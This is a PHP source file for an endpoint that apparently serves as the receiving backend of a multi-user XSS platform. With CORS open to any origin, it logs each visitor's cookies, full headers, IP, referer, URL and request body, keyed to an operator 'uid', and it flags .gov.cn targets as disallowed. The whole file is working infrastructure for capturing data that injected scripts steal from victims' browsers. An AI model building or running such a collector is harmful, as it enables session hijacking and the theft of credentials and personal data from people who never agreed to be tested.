<?php
/**
 * API数据收集接口
 */

// 标记为API请求，避免config.php设置冲突的header
define('IS_API_REQUEST', true);

// 错误日志
error_reporting(E_ALL);
ini_set('display_errors', 0);
ini_set('log_errors', 1);
ini_set('error_log', __DIR__ . '/../data/api_errors.log');

// 先设置header，确保之前没有任何输出
header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, Authorization');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

// 再引入config.php
require_once __DIR__ . '/../config.php';

// 生成唯一ID
function generateUuid() {
    return sprintf('%04x%04x-%04x-%04x-%04x-%04x%04x%04x',
        mt_rand(0, 0xffff), mt_rand(0, 0xffff),
        mt_rand(0, 0xffff),
        mt_rand(0, 0x0fff) | 0x4000,
        mt_rand(0, 0x3fff) | 0x8000,
        mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff)
    );
}

// 获取客户端IP（防止HTTP头伪造）
function getClientIpAddr() {
    $ip = $_SERVER['REMOTE_ADDR'];
    
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $forwardedIps = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        $forwardedIp = trim($forwardedIps[0]);
        if (filter_var($forwardedIp, FILTER_VALIDATE_IP)) {
            $ip = $forwardedIp;
        }
    } elseif (!empty($_SERVER['HTTP_X_REAL_IP'])) {
        $realIp = trim($_SERVER['HTTP_X_REAL_IP']);
        if (filter_var($realIp, FILTER_VALIDATE_IP)) {
            $ip = $realIp;
        }
    }
    
    return $ip;
}

try {
    // 连接数据库
    $pdo = getDbConnection();
    
    // 收集访问者信息（添加数据长度限制防止DOS攻击）
    $visitorData = [
        'log_id' => generateUuid(),
        'ip' => getClientIpAddr(),
        'user_agent' => substr($_SERVER['HTTP_USER_AGENT'] ?? '', 0, 500),
        'referer' => substr($_SERVER['HTTP_REFERER'] ?? '', 0, 2000),
        'url' => substr((isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://{$_SERVER['HTTP_HOST']}{$_SERVER['REQUEST_URI']}", 0, 2000),
        'method' => $_SERVER['REQUEST_METHOD'],
        'endpoint' => '/api/collect',
        'cookies' => substr(json_encode($_COOKIE), 0, 10000),
        'headers' => substr(json_encode(getallheaders() ?: []), 0, 10000),
        'content_type' => substr($_SERVER['CONTENT_TYPE'] ?? '', 0, 200),
        'created_at' => date('Y-m-d H:i:s')
    ];
    
    // 从URL参数中获取用户ID（用于多用户数据隔离，验证为正整数）
    $userId = isset($_GET['uid']) ? (int)$_GET['uid'] : null;
    if ($userId && $userId > 0) {
        // 验证user_id是否存在
        $checkStmt = $pdo->prepare("SELECT id FROM users WHERE id = ?");
        $checkStmt->execute([$userId]);
        if ($checkStmt->fetch()) {
            $visitorData['user_id'] = $userId;
        } else {
            $visitorData['user_id'] = null;
        }
    } else {
        $visitorData['user_id'] = null; // 未指定用户ID的日志只有管理员能看到
    }

    // 根据请求方法处理数据
    $requestData = [];
    $rawData = '';
    
    if ($_SERVER['REQUEST_METHOD'] === 'GET') {
        $requestData = $_GET;
        $visitorData['data_type'] = 'query_params';
        $rawData = substr(http_build_query($_GET), 0, 50000); // 限制长度
    } elseif (in_array($_SERVER['REQUEST_METHOD'], ['POST', 'PUT', 'PATCH'])) {
        $rawData = substr(file_get_contents('php://input'), 0, 100000); // 限制100KB防止DOS
        $contentType = strtolower($_SERVER['CONTENT_TYPE'] ?? '');
        
        if (strpos($contentType, 'application/json') !== false) {
            $requestData = json_decode($rawData, true);
            if (json_last_error() !== JSON_ERROR_NONE) {
                error_log('JSON decode error: ' . json_last_error_msg());
                $requestData = ['raw' => $rawData, 'error' => json_last_error_msg()];
            }
            $visitorData['data_type'] = 'json';
        } elseif (strpos($contentType, 'application/x-www-form-urlencoded') !== false) {
            $requestData = $_POST;
            $visitorData['data_type'] = 'form';
        } elseif (strpos($contentType, 'multipart/form-data') !== false) {
            $requestData = ['form' => $_POST, 'files' => array_keys($_FILES)];
            $visitorData['data_type'] = 'multipart';
        } else {
            $requestData = ['raw' => $rawData];
            $visitorData['data_type'] = 'raw';
        }
    } elseif ($_SERVER['REQUEST_METHOD'] === 'DELETE') {
        $requestData = $_GET;
        $visitorData['data_type'] = 'delete_request';
        $rawData = http_build_query($_GET);
    }

    // 确保data字段始终是JSON格式
    $visitorData['data'] = json_encode($requestData, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
    $visitorData['raw_data'] = $rawData;
    
    // ========== 检测政府网站 (.gov.cn) ==========
    $isGovSite = false;
    $urlsToCheck = [
        $visitorData['url'],
        $visitorData['referer'],
        isset($requestData['url']) ? $requestData['url'] : ''
    ];
    
    foreach ($urlsToCheck as $checkUrl) {
        if (!empty($checkUrl) && preg_match('/\.gov\.cn/i', $checkUrl)) {
            $isGovSite = true;
            break;
        }
    }
    
    // 如果检测到政府网站，标记为违规
    $visitorData['is_gov_site'] = $isGovSite ? 1 : 0;
    
    // 记录违规尝试到安全日志
    if ($isGovSite) {
        error_log("[SECURITY WARNING] 用户 {$visitorData['user_id']} 尝试对政府网站进行XSS测试！URL: {$visitorData['url']}, Referer: {$visitorData['referer']}");
    }

    // 保存到数据库（$pdo已在开头获取）
    $stmt = $pdo->prepare("
        INSERT INTO logs 
        (log_id, user_id, ip, user_agent, referer, url, method, endpoint, cookies, headers, data, data_type, raw_data, content_type, is_gov_site, created_at) 
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    ");
    
    $result = $stmt->execute([
        $visitorData['log_id'],
        $visitorData['user_id'],
        $visitorData['ip'],
        $visitorData['user_agent'],
        $visitorData['referer'],
        $visitorData['url'],
        $visitorData['method'],
        $visitorData['endpoint'],
        $visitorData['cookies'],
        $visitorData['headers'],
        $visitorData['data'],
        $visitorData['data_type'],
        $visitorData['raw_data'],
        $visitorData['content_type'],
        $visitorData['is_gov_site'],
        $visitorData['created_at']
    ]);

    if (!$result) {
        throw new Exception('Database insert failed: ' . implode(', ', $stmt->errorInfo()));
    }

    header('Content-Type: application/json');
    echo json_encode([
        'status' => 'success',
        'message' => 'Data collected successfully',
        'id' => $visitorData['log_id']
    ]);

} catch (Exception $e) {
    error_log('API Error: ' . $e->getMessage());
    
    header('Content-Type: application/json');
    http_response_code(500);
    echo json_encode([
        'status' => 'error',
        'message' => 'Data collection failed: ' . $e->getMessage()
    ]);
}
